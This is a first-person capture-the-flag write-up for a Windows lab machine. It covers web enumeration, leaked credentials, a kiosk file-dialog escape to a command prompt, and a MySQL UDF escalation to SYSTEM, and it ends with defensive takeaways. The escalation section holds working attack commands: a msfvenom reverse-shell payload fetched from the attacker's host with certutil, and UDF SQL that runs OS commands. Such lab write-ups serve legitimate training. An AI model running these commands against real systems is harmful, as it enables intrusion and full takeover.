00 Overview

Touch is a Windows box built around a kiosk-mode passport-scanning terminal. I got user through a chain of web-exposed secrets and a kiosk-to-desktop escape, then got root through a classic MySQL UDF privilege escalation enabled by a misconfigured plugin directory.

01 Recon

I started with a standard nmap scan:

nmap -sV -sC <target_ip>
PortService
135msrpc
3389ms-wbt-server (RDP)
5985WinRM (HTTP)
8443HTTP — "Nexion DeviceHub" login page

No domain-related ports showed up (no LDAP, no Kerberos), so I figured this was a standalone/workgroup machine rather than a domain-joined one. The web app on 8443 looked like the obvious way in.

02 Web Enumeration — Nexion DeviceHub

The login page on :8443 only asked for a device password. I checked the page source and found a hint: the default password is the device's serial number.

1
I ran gobuster and found an /api route:
gobuster dir -u http://<target_ip>:8443 -w /usr/share/wordlists/dirb/common.txt -b 302,404
2
/api on its own didn't show anything useful, so I ran gobuster again against it as its own base path:
gobuster dir -u http://<target_ip>:8443/api -w /usr/share/wordlists/dirb/common.txt -b 302,404
3
That turned up /api/status, which leaked the device's serial number — I used it as the login password.
4
Inside the dashboard I found controls for the kiosk's printer/scanner hardware, plus a set of Windows kiosk credentials sitting right there in plaintext.
Why this matters: this one leaked status endpoint is the root cause of everything that follows — the serial number unlocks the dashboard, the dashboard leaks OS credentials, and those credentials unlock the kiosk session.

03 Kiosk Breakout → User Flag

1
I logged into the Windows kiosk session over RDP with the leaked creds:
xfreerdp /u:KioskUser /p:'<password>' /v:<target_ip>
The session was locked to a single-purpose kiosk app, with no obvious way to reach a normal desktop.
2
Using a booking confirmation (name + code) the challenge gave me, the kiosk app asked me to scan a passport.
3
Back in the DeviceHub dashboard, I disabled the scanner remotely. Back on the kiosk, the scan step now failed and showed an error with a link to a troubleshooting article.
4
I clicked that link and it opened the error page in Microsoft Edge — breaking me out of the locked-down kiosk shell into a full browser window.
5
From Edge, I hit Ctrl+O to open a file picker, then typed cmd into the file-path field — that launched a command prompt. Classic file-dialog-to-shell kiosk escape.
6
With a working shell, I read the user flag:
type C:\Users\<user>\Desktop\user.txt
🚩 user.txt captured

04 Privilege Escalation → SYSTEM

Getting a stable session

A raw cmd.exe shell is fragile, so I set up a Meterpreter session instead:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<tun0_ip> LPORT=4444 -f exe -o shell.exe

I hosted it with Python's built-in HTTP server and pulled it onto the target with the built-in certutil utility:

python3 -m http.server 8000
certutil -urlcache -split -f http://<tun0_ip>:8000/shell.exe shell.exe

I had a Metasploit multi/handler waiting, so it caught the callback as soon as I ran shell.exe.

Enumeration

1
I ran the usual context checks — whoami /priv, whoami /groups, sysinfo — but nothing jumped out as an easy token-based privesc path.
2
Poking around the filesystem, I found a local MySQL 8.0 install running as LocalSystem — a red flag, since any way of getting MySQL to run OS commands would inherit SYSTEM rights.
3
A config file for the kiosk backend app (\Kiosk\packages\backend\src\database\index.ts) contained a low-privileged MySQL username and password.
4
A batch script at ProgramData\HTB Airways\refresh-dates.bat contained the MySQL root password in plaintext.

The UDF chain

1
I logged into MySQL as root and checked my privileges:
mysql -u root -p'<root_pass>' -e "SHOW GRANTS FOR CURRENT_USER();"
Root had both FILE and GRANT privileges. FILE is the key one here — it lets a SQL user write arbitrary files to disk.
2
I checked where MySQL loads plugins from, then checked that folder's permissions:
mysql -u root -p'<root_pass>' -e "SHOW VARIABLES LIKE 'plugin_dir';"
icacls C:\MySQL\lib\plugin\
Result: NT AUTHORITY\Authenticated Users had Modify rights on a folder MySQL fully trusts. That ACL misconfiguration — not the UDF feature itself — is the actual bug here.
3
I dropped the well-known lib_mysqludf_sys_64.dll library into that writable plugin directory.
4
I registered a function from that library as a MySQL UDF:
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';
5
I checked what context it ran under:
SELECT sys_eval('whoami');
It came back nt authority\system — SQL queries were now running OS commands as SYSTEM.
6
I used the same function to grab the root flag:
SELECT sys_eval('type C:\Users\Administrator\Desktop\root.txt');
🚩 root.txt captured

05 Takeaways

  • Least privilege for services. Running MySQL as LocalSystem turned an otherwise contained SQL misconfiguration into instant SYSTEM.
  • Folder permissions are trust boundaries. A folder a privileged process trusts being writable by a broad group like Authenticated Users is a classic Windows privesc pattern.
  • Databases can run code, not just store it. MySQL UDFs can translate database privilege into OS command execution.
  • Small leaks add up. Credentials leaked from an admin panel → an app config file → a batch script. None alone was catastrophic, but together they were.
  • Kiosk hardening gaps. One reachable browser file dialog was enough to break the entire kiosk lockdown.
